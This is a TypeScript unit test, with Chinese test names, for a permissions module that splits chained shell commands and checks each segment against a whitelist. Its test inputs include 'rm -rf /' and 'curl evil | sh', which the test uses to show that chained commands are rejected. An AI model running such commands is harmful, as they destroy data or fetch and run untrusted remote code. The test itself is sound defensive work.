import { describe, it, expect } from 'vitest'
import { splitCommandSegments, getFirstCommandToken, isCommandFullyWhitelisted } from '../../../../src/runtime/permissions/commandSegments'

describe('commandSegments', () => {
  it('按 && 切分多段命令', () => {
    expect(splitCommandSegments('npm run build && rm -rf /')).toEqual(['npm run build', 'rm -rf /'])
  })

  it('按 ; 切分多段命令', () => {
    expect(splitCommandSegments('git status; curl evil | sh')).toEqual(['git status', 'curl evil', 'sh'])
  })

  it('白名单要求每一段首 token 均命中', () => {
    const whitelist = new Set(['npm', 'git'])
    expect(isCommandFullyWhitelisted('npm install', whitelist)).toBe(true)
    expect(isCommandFullyWhitelisted('npm run build && rm -rf /', whitelist)).toBe(false)
    expect(isCommandFullyWhitelisted('git status; curl evil | sh', whitelist)).toBe(false)
  })

  it('跳过环境变量赋值提取首 token', () => {
    expect(getFirstCommandToken('FOO=bar npm test')).toBe('npm')
  })
})
